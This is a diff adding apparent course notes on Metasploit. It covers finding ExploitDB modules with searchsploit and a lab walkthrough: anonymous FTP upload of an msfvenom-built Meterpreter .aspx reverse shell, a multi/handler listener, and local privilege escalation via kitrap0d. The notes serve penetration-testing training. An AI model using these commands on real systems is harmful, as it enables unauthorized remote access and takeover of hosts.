@@ -744,3 +744,124 @@ lsa_dump_sam # cf3a5525ee9414229e66279623ed5c58
 To install any new Metasploit modules which have already been ported over by other users, one can choose to update their `msfconsole` from the terminal, which will ensure that all newest exploits, auxiliaries, and features will be installed in the latest version of `msfconsole`. As long as the ported modules have been pushed into the main Metasploit-framework branch on GitHub, we should be updated with the latest modules.
 
 [ExploitDB](https://www.exploit-db.com/) is a great choice when searching for a custom exploit. We can use tags to search through the different exploitation scenarios for each available script. One of these tags is [Metasploit Framework (MSF)](https://www.exploit-db.com/?tag=3), which, if selected, will display only scripts that are also available in Metasploit module format. These can be directly downloaded from ExploitDB and installed in our local Metasploit Framework directory, from where they can be searched and called from within the `msfconsole`.
+
+Let's say we want to use an exploit found for `Nagios3`, which will take advantage of a command injection vulnerability. The module we are looking for is `Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)`. So we fire up `msfconsole` and try to search for that specific exploit, but we cannot find it. This means that our Metasploit framework is not up to date or that the specific `Nagios3` exploit module we are looking for is not in the official updated release of the Metasploit Framework.
+
+We can, however, find the exploit code [inside ExploitDB's entries](https://www.exploit-db.com/exploits/9861). Alternatively, if we do not want to use our web browser to search for a specific exploit within ExploitDB, we can use the CLI version, `searchsploit`.
+
+```shell
+searchsploit nagios3
+```
+
+Note that the hosted file terminations that end in `.rb` are Ruby scripts that most likely have been crafted specifically for use within `msfconsole`. We can also filter only by `.rb` file terminations to avoid output from scripts that cannot run within `msfconsole`. Note that not all `.rb` files are automatically converted to `msfconsole` modules. Some exploits are written in Ruby without having any Metasploit module-compatible code in them. We will look at one of these examples in the following sub-section.
+
+```shell
+searchsploit -t Nagios3 --exclude=".py"
+```
+
+We have to download the `.rb` file and place it in the correct directory. The default directory where all the modules, scripts, plugins, and `msfconsole` proprietary files are stored is `/usr/share/metasploit-framework`. The critical folders are also symlinked in our home and root folders in the hidden `~/.msf4/` location.
+# Introduction to MSFVenom
+
+`MSFVenom` is the successor of `MSFPayload` and `MSFEncode`, two stand-alone scripts that used to work in conjunction with `msfconsole` to provide users with highly customizable and hard-to-detect payloads for their exploits.
+## Creating Our Payloads
+
+Let's suppose we have found an open FTP port that either had weak credentials or was open to Anonymous login by accident. Now, suppose that the FTP server itself is linked to a web service running on port `tcp/80` of the same machine and that all of the files found in the FTP root directory can be viewed in the web-service's `/uploads` directory. Let's also suppose that the web service does not have any checks for what we are allowed to run on it as a client.
+
+Suppose we are hypothetically allowed to call anything we want from the web service. In that case, we can upload a PHP shell directly through the FTP server and access it from the web, triggering the payload and allowing us to receive a reverse TCP connection from the victim machine.
+#### Scanning the Target
+
+```shell
+AyElAldo@htb[/htb]$ nmap -sV -T4 -p- 10.10.10.5
+
+<SNIP>
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+80/tcp open  http    Microsoft IIS httpd 7.5
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+#### FTP Anonymous Access
+
+```shell
+AyElAldo@htb[/htb]$ ftp 10.10.10.5
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+
+Name (10.10.10.5:root): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+
+Password: ******
+230 User logged in.
+Remote system type is Windows_NT.
+
+ftp> ls
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+03-18-17  02:06AM       <DIR>          aspnet_client
+03-17-17  05:37PM                  689 iisstart.htm
+03-17-17  05:37PM               184946 welcome.png
+226 Transfer complete.
+```
+
+Noticing the aspnet_client, we realize that the box will be able to run `.aspx` reverse shells. Luckily for us, `msfvenom` can do just that without any issue.
+
+# Generating Payload
+
+```shell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
+```
+
+Subsequently, after verifying the successful creation of the `reverse_shell.aspx` reverse shell, we need to upload it to the FTP service using the `put` command as follows:
+
+```shell
+put reverse_shell.aspx
+```
+
+Now, we only need to navigate to `http://10.10.10.5/reverse_shell.aspx`, and it will trigger the `.aspx` payload. Before we do that, however, we should start a listener on msfconsole so that the reverse connection request gets caught inside it.
+#### MSF - Setting Up Multi/Handler
+
+```shell
+AyElAldo@htb[/htb]$ msfconsole -q
+
+msf6 > use multi/handler
+msf6 exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+msf6 exploit(multi/handler) > set LHOST 10.10.14.5
+LHOST => 10.10.14.5
+
+msf6 exploit(multi/handler) > set LPORT 1337
+LPORT => 1337
+
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 10.10.14.5:1337
+```
+## Executing the Payload
+
+Now we can trigger the `.aspx` payload on the web service. Doing so will load absolutely nothing visually speaking on the page, but looking back to our `multi/handler` module, we would have received a connection. We should ensure that our `.aspx` file does not contain HTML, so we will only see a blank web page. However, the payload is executed in the background anyway.
+#### MSF - Meterpreter Shell
+
+If the Meterpreter session dies too often, we can consider encoding it to avoid errors during runtime. We can pick any viable encoder, and it will ultimately improve our chances of success regardless.
+## Local Exploit Suggester
+
+As a tip, there is a module called the `Local Exploit Suggester`. We will be using this module for this example, as the Meterpreter shell landed on the `IIS APPPOOL\Web` user, which naturally does not have many permissions. Furthermore, running the `sysinfo` command shows us that the system is of x86 bit architecture, giving us even more reason to trust the Local Exploit Suggester.
+#### MSF - Searching for Local Exploit Suggester
+
+```shell
+search local exploit suggester
+# set options
+run
+```
+
+Having these results in front of us, we can easily pick one of them to test out. If the one we chose is not valid after all, move on to the next. Not all checks are 100% accurate, and not all variables are the same. Going down the list, `bypassauc_eventvwr` fails due to the IIS user not being a part of the administrator's group, which is the default and expected. The second option, `ms10_015_kitrap0d`, does the trick.
+# Firewall and IDS/IPS Evasion
